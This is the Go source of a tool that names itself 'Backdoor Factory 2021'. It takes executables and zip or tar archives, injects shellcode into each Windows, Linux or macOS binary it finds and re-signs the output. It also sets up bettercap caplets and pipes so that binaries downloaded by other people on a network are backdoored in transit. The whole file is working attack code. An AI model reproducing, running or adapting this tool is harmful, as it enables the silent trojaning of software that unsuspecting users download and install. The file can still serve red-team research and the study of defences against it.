package main

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/Binject/shellcode/api"

	"github.com/akamensky/argparse"

	"github.com/Binject/binjection/bj"
	"github.com/Binject/shellcode"
	"github.com/h2non/filetype"
	"github.com/sassoftware/relic"
	"github.com/sassoftware/relic/cmdline/token"
)
func writeRelicConfig() {

	//err := nil
	mydir, err := os.Getwd()
    if err != nil {
        fmt.Println(err)
    }

	src, err := os.Open(filepath.Join(mydir, "relic.yml"))
	if err != nil {
		log.Fatal(err)
		
	}

	
	defer src.Close()

	homedir, err := os.UserHomeDir()
    if err != nil {
        log.Fatal( err )
    }

	//path := homedir+ "/.config/relic"


	os.MkdirAll(filepath.Join(homedir, ".config", "relic"), 0777)
	if err != nil {
        log.Fatal( err )
    }
	dst, err := os.Create(filepath.Join(homedir, ".config", "relic", "relic.yml")) // dir is directory where you want to save file.
	if err != nil {
		log.Fatal(err)
		
	}
	defer dst.Close()
	if _, err = io.Copy(dst, src); err != nil {
		log.Fatal(err)
		
	}


	

}
func main() {

	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	parser := argparse.NewParser("backdoorfactory", "Backdoor Factory 2021")
	scDir := parser.String("d", "shelldir", &argparse.Options{Required: true,
		Default: filepath.Join(dir, "shellcode"), Help: "Shellcode Directory"})

	cwd := parser.String("c", "cwd", &argparse.Options{Required: false,
		Default: dir, Help: "Working Directory"})

	initMode := parser.Flag("i", "init", &argparse.Options{Required: false,
		Help: "Create the empty shellcode directories, write the relic.yml config file to disk, and quit"})

	// One-Shot Mode is for testing injections locally
	testfile := parser.String("t", "testfile", &argparse.Options{Required: false,
		Help: "File to inject into (oneshot test mode)"})
	outfile := parser.String("o", "out", &argparse.Options{Required: false,
		Help: "Output file (oneshot test mode)"})
	// relic config directory
	//rcDir := parser.String("r", "relicconfigdir", &argparse.Options{Required: true,
	//		Default: filepath.Join(dir, "relicconfig"), Help: "Specify relic config location. If you don't specify, one will be made for you in ~/.config/relic"})

	if err := parser.Parse(os.Args); err != nil {
		log.Println(parser.Usage(err))
		return
	}
	if *outfile == "" {
		*outfile = *testfile + ".b"
	}

	repo := shellcode.NewRepo(*scDir)
	writeRelicConfig()

	if *initMode {
		log.Println("Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.\n Also edit the relic config in this folder to include the paths to your keys. relic.yml in this folder is copied to $HOME/.config/relic/relic.yml on every launch")
		return
	}

	



	config := &bj.BinjectConfig{Repo: repo, CodeCaveMode: false}

	if *testfile != "" { // One-shot test mode
		f, err := os.Open(*testfile)
		if err != nil {
			log.Fatal(err)
		}
		dry, err := ioutil.ReadAll(f)
		if err != nil {
			log.Fatal(err)
		}
		wet, err := Inject(bytes.NewBuffer(dry), config)
		if err != nil {
			log.Fatal(err)
		}
		err = ioutil.WriteFile(*outfile, wet.Bytes(), 0755)
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	pipeName := ""
	if runtime.GOOS == "windows" {
		pipeName = `\\.\pipe\` + "bdf"
	} else {
		pipeName = filepath.Join(*cwd, "bdf")
	}
	dryPipe := pipeName + "dry"
	wetPipe := pipeName + "wet"
	capletPath := filepath.Join(*cwd, "binject.cap")

	if err := GenerateCaplet(capletPath); err != nil {
		log.Fatal(err)
	}
	if err := GenerateCapletScript(filepath.Join(*cwd, "binject.js"), CapletScriptConfig{DryPipe: dryPipe, WetPipe: wetPipe}); err != nil {
		log.Fatal(err)
	}

	log.Printf("RUN THIS COMMAND in another terminal:\n\tbettercap -caplet %s\n", capletPath)

	go ListenPipeDry(dryPipe, config)
	ListenPipeWet(wetPipe)
}

// Inject a binary or archive
func Inject(dry *bytes.Buffer, config *bj.BinjectConfig) (wet *bytes.Buffer, err error) {

	kind, _ := filetype.Match(dry.Bytes())
	if kind == filetype.Unknown || kind.MIME.Type != "application" {
		return dry, nil // unknown type or non-application type (archives are application type also), pass it on
	}
	fmt.Printf("File type: %s. MIME: %s %s %s\n", kind.Extension, kind.MIME.Type, kind.MIME.Subtype, kind.MIME.Value)

	switch kind.MIME.Subtype {
	case "gzip":
		return injectTarGz(dry, config)

	case "x-executable":
		return injectIfBinary(dry, config)

	case "vnd.microsoft.portable-executable":
		return injectIfBinary(dry, config)
		
	case "x-tar":
		return injectTar(dry, config)

	case "zip":
		return injectZip(dry, config)
	}

	return dry, nil // default to doing nothing
}

func injectZip(dry *bytes.Buffer, config *bj.BinjectConfig) (*bytes.Buffer, error) {

	w := bytes.NewBuffer(nil)
	zw := zip.NewWriter(w)
	zr, err := zip.NewReader(bytes.NewReader(dry.Bytes()), int64(dry.Len()))
	if err != nil {
		return nil, err
	}
	for _, file := range zr.File {
		// Read a file from input
		if file.Mode().IsDir() {
			continue
		}
		f, err := file.Open()
		if err != nil {
			return nil, err
		}
		data, err := ioutil.ReadAll(f)
		f.Close()
		if err != nil {
			return nil, err
		}
		// Inject
		datab, err := injectIfBinary(bytes.NewBuffer(data), config)
		if err != nil {
			return nil, err
		}
		hdr, err := zip.FileInfoHeader(file.FileInfo())
		if err != nil {
			return nil, err
		}
		// Write injected file to output
		fw, err := zw.CreateHeader(hdr)
		if err != nil {
			return nil, err
		}
		_, err = datab.WriteTo(fw)
		if err != nil {
			return nil, err
		}
	}
	err = zw.Close()
	if err != nil {
		return nil, err
	}
	return w, nil
}

func injectTarGz(dry *bytes.Buffer, config *bj.BinjectConfig) (*bytes.Buffer, error) {
	zr, err := gzip.NewReader(dry)
	if err != nil {
		return nil, err
	}
	defer zr.Close()

	ob, err := injectTar(zr, config)
	if err != nil {
		return nil, err
	}
	w := bytes.NewBuffer(nil)
	gw, err := gzip.NewWriterLevel(w, gzip.BestCompression)
	if err != nil {
		return nil, err
	}
	_, err = ob.WriteTo(gw)
	if err != nil {
		return nil, err
	}
	err = gw.Close()
	if err != nil {
		return nil, err
	}
	return w, nil
}

func injectTar(dry io.Reader, config *bj.BinjectConfig) (*bytes.Buffer, error) {

	w := bytes.NewBuffer(nil)
	tw := tar.NewWriter(w)
	tr := tar.NewReader(dry)
	for {
		// Read a file from input
		hdr, err := tr.Next()
		if err != nil {
			if err == io.EOF {
				break
			}
			return nil, err
		}
		if hdr.FileInfo().IsDir() {
			continue
		}
		data, err := ioutil.ReadAll(tr)
		if err != nil {
			return nil, err
		}
		// Inject
		datab, err := injectIfBinary(bytes.NewBuffer(data), config)
		if err != nil {
			return nil, err
		}
		// Write injected file to output
		hdr.Size = int64(datab.Len())
		if err := tw.WriteHeader(hdr); err != nil {
			return nil, err
		}
		_, err = datab.WriteTo(tw)
		if err != nil {
			return nil, err
		}
	}
	err := tw.Close()
	if err != nil {
		return nil, err
	}
	return w, nil
}

func injectIfBinary(dry *bytes.Buffer, config *bj.BinjectConfig) (*bytes.Buffer, error) {
	bintype, err := bj.BinaryMagic(dry.Bytes())
	if err != nil {
		return nil, err
	}
	newos := api.Windows
	switch bintype {
	case bj.MACHO:
		newos = api.Darwin
	case bj.ELF:
		newos = api.Linux
	case bj.PE:
		newos = api.Windows
	}
	// todo: detect 32 vs 64 bit, for now just default to 64

	scdata, err := config.Repo.Lookup(newos, api.Intel64, "*.bin")
	if err != nil {
		return nil, err
	}

	b, err := bj.Binject(dry.Bytes(), scdata, config)

	//Initialize the parts of the cobra command that aren't called unless you run from command line.
	//since relic is a cobracommand project, there are a bunch of values that must be initialized per signature

	relic.SpinUp()

	//sign the bytestream. This creates a temporary file and signs
	b2 := token.SpecialSign(b)

	return bytes.NewBuffer(b2), err
}
